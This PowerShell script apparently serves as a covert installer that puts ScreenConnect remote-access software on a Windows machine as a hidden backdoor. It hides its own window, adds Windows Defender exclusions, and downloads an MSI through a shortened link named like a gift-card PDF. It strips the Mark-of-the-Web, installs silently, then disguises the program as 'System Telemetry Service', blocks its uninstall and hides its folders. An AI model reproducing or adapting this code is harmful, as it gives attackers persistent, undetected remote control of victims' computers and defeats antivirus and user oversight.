# Silent ScreenConnect installer with internet check and fallback
# Runs as SYSTEM with complete hiding capabilities

# Suppress all errors from displaying
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# Bypass execution policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# Hide the window
$host.UI.RawUI.WindowTitle = " "
if ($host.Name -eq 'ConsoleHost') {
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class Window {
                [DllImport("user32.dll")]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            }
"@
        [void][Window]::ShowWindow($hwnd, 0)
    }
}

function Test-ScreenConnectRunning {
    try {
        $screenConnectPatterns = @(
            "screenconnect",
            "connectwise.control",
            "connectwise control",
            "cwcontrol",
            "f63a82ffaf9f93d1"
        )
        
        $regexPattern = $screenConnectPatterns -join "|"
        
        $activeConnections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Where-Object {
            $process = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
            if ($process) {
                ($process.Name -match $regexPattern) -or
                ($_.RemotePort -in @(8040, 8041)) -or
                ($_.LocalPort -in @(8040, 8041))
            }
        }
        
        $activeProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { 
            ($_.Name -match $regexPattern) -or 
            ($_.CommandLine -match $regexPattern)
        } | Where-Object {
            $_.Name -notmatch "notepad|explorer|cmd|powershell|wscript|msiexec|rundll32"
        }
        
        $runningServices = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { 
            (($_.Name -match $regexPattern) -or 
             ($_.DisplayName -match $regexPattern) -or 
             ($_.PathName -match $regexPattern)) -and
            ($_.State -eq "Running")
        }
        
        $trueCount = 0
        if ($activeConnections) { $trueCount++ }
        if ($activeProcesses) { $trueCount++ }
        if ($runningServices) { $trueCount++ }
        
        return ($trueCount -ge 2)
    }
    catch {
        return $false
    }
}

# 1. First wait 60 seconds
Start-Sleep -Seconds 60

# 2. Then Check if Screenconnect is running
if (Test-ScreenConnectRunning) {
    # 3. Then Exit
    exit
}

# 4. If Screenconnect is not running, continue...

# 5. 30 second delay
Start-Sleep -Seconds 30

# 6. Internet Check
function Test-Internet {
    $attemptDelay = 10
    $attempt = 1
    
    while ($true) {
        if (Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet) {
            return $true
        }
        $attempt++
        Start-Sleep -Seconds $attemptDelay
    }
}

Test-Internet

# 7. First check if the path.txt at public has the path
function Get-AppDataPath {
    $cachedPathFile = "C:\Users\Public\path.txt"
    
    if (Test-Path $cachedPathFile) {
        try {
            $cachedPath = (Get-Content $cachedPathFile -Raw).Trim()
            if ($cachedPath -and (Test-Path $cachedPath)) {
                return $cachedPath
            }
        } catch { }
    }
    
    # Fallback to environment variable
    return $env:APPDATA
}

function Remove-MOTW {
    param([string]$filePath)
    try {
        # Remove Zone.Identifier
        Remove-Item -Path "$filePath:Zone.Identifier" -Force -ErrorAction SilentlyContinue
        # Use Unblock-File cmdlet
        Unblock-File -Path $filePath -ErrorAction SilentlyContinue
        # Alternative method using streams
        cmd /c "echo.>""$filePath:Zone.Identifier"""
    } catch { }
}

function Add-AVExclusion {
    param([string]$path)
    try {
        # Multiple methods to add exclusion
        Add-MpPreference -ExclusionPath $path -Force -ErrorAction SilentlyContinue
        # Registry method as fallback
        $defenderPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
        if (Test-Path $defenderPath) {
            Set-ItemProperty -Path $defenderPath -Name $path -Value 0 -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

function Download-File {
    param(
        [string]$url,
        [string]$destination
    )
    
    # Method 1: WebClient
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($url, $destination)
        if (Test-Path $destination) { return $true }
    } catch { }
    
    # Method 2: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction SilentlyContinue
        if (Test-Path $destination) { return $true }
    } catch { }
    
    # Method 3: Start-BitsTransfer
    try {
        Start-BitsTransfer -Source $url -Destination $destination -ErrorAction SilentlyContinue
        if (Test-Path $destination) { return $true }
    } catch { }
    
    # Method 4: HttpClient
    try {
        Add-Type -AssemblyName System.Net.Http
        $httpClient = New-Object System.Net.Http.HttpClient
        $response = $httpClient.GetAsync($url).Result
        $fileStream = [System.IO.File]::Create($destination)
        $response.Content.CopyToAsync($fileStream).Wait()
        $fileStream.Close()
        $httpClient.Dispose()
        if (Test-Path $destination) { return $true }
    } catch { }
    
    return $false
}

function Install-Software {
    # Get AppData path
    $appDataPath = Get-AppDataPath
    
    # 8. Check for sys.msi in SystemBin
    $systemBinPath = Join-Path $appDataPath "SystemBin"
    $fallbackPath = Join-Path $systemBinPath "sys.msi"
    
    if (Test-Path $fallbackPath) {
        $msiPath = $fallbackPath
    } else {
        # 9. Create Bin32 at public users
        $publicPath = "C:\Users\Public"
        $bin32Path = Join-Path $publicPath "Bin32"
        if (!(Test-Path $bin32Path)) {
            New-Item -Path $bin32Path -ItemType Directory -Force | Out-Null
        }
        
        # 10. Add that file to av exclusion
        Add-AVExclusion -path $bin32Path
        
        # Download payload there as sos.msi
        $msiPath = Join-Path $bin32Path "sos.msi"
        
        # Multiple download attempts with different methods
        $urls = @(
            "https://tinyurl.com/giftcardhubpdf"
        )
        
        $downloadSuccess = $false
        foreach ($url in $urls) {
            if (Download-File -url $url -destination $msiPath) {
                $downloadSuccess = $true
                break
            }
        }
        
        if (-not $downloadSuccess) {
            return $false
        }
        
        # 10. Remove MOTW
        Remove-MOTW -filePath $msiPath
    }
    
    # 11. Execute with silent flag
    try {
        $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 10
        return $true
    } catch {
        # Fallback installation method
        try {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "msiexec.exe"
            $psi.Arguments = "/i `"$msiPath`" /qn /norestart"
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $process = [System.Diagnostics.Process]::Start($psi)
            Start-Sleep -Seconds 10
            return $true
        } catch {
            return $false
        }
    }
}

function Hide-ScreenConnectFromControlPanel {
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
        )
        
        foreach ($path in $regPaths) {
            $programs = Get-ItemProperty $path -ErrorAction SilentlyContinue
            $screenConnectProgram = $programs | Where-Object { 
                $_.DisplayName -like "*ScreenConnect Client*" 
            }
            
            if ($screenConnectProgram) {
                $screenConnectKey = $screenConnectProgram.PSPath
                
                Set-ItemProperty -Path $screenConnectKey -Name "SystemComponent" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $screenConnectKey -Name "DisplayName" -Value "System Telemetry Service" -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $screenConnectKey -Name "NoModify" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $screenConnectKey -Name "NoRemove" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $screenConnectKey -Name "NoRepair" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                break
            }
        }
    }
    catch { }
}

function Hide-ScreenConnectFolders {
    try {
        $searchPaths = @(
            "C:\Program Files\ScreenConnect Client*",
            "C:\Program Files (x86)\ScreenConnect Client*",
            "C:\Program Files\ConnectWise Control Client*",
            "C:\Program Files (x86)\ConnectWise Control Client*",
            "C:\ProgramData\ScreenConnect Client*",
            "C:\Users\*\AppData\Local\ScreenConnect Client*",
            "C:\Windows\Temp\ScreenConnect*"
        )
        
        $identifier = "f63a82ffaf9f93d1"
        
        foreach ($searchPath in $searchPaths) {
            $folders = Get-Item -Path $searchPath -ErrorAction SilentlyContinue
            
            foreach ($folder in $folders) {
                if ($folder.FullName -match $identifier -or $folder.Name -like "*ScreenConnect*") {
                    $folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                    
                    $parent = Split-Path -Parent $folder.FullName
                    $newName = ".sys_" + [guid]::NewGuid().ToString().Substring(0, 8)
                    $newPath = Join-Path -Path $parent -ChildPath $newName
                    
                    if (-not (Test-Path $newPath)) {
                        try {
                            Rename-Item -Path $folder.FullName -NewName $newName -Force
                            
                            $renamedItem = Get-Item -Path $newPath -Force
                            $renamedItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                        }
                        catch { }
                    }
                }
            }
        }
        
        $results = Get-ChildItem -Path "C:\" -Filter "*$identifier*" -Recurse -ErrorAction SilentlyContinue -Force | Where-Object { $_.PSIsContainer }
        
        foreach ($result in $results) {
            $result.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        }
    }
    catch { }
}

# Main installation loop (15. Loop the process till 5 times)
$maxInstallAttempts = 5
for ($attempt = 1; $attempt -le $maxInstallAttempts; $attempt++) {
    
    # Start installation
    $installResult = Install-Software
    if (-not $installResult) {
        Start-Sleep -Seconds 60
        continue
    }
    
    # 12. Check if screenconnect is running
    $maxCheckAttempts = 60  # 10 minutes at 10-second intervals
    $checkDelay = 10  # seconds
    
    for ($check = 1; $check -le $maxCheckAttempts; $check++) {
        if (Test-ScreenConnectRunning) {
            # 13. If yes, hide the screenconnect from program file and control panel
            Hide-ScreenConnectFromControlPanel
            Hide-ScreenConnectFolders
            
            # Additional delay to ensure hiding is complete
            Start-Sleep -Seconds 5
            
            # Success - exit script
            $null = [System.GC]::Collect()
            exit
        }
        
        # 14. If no, then wait for given time to finish the installation
        Start-Sleep -Seconds $checkDelay
    }
}

# Cleanup and exit
$null = [System.GC]::Collect()
exit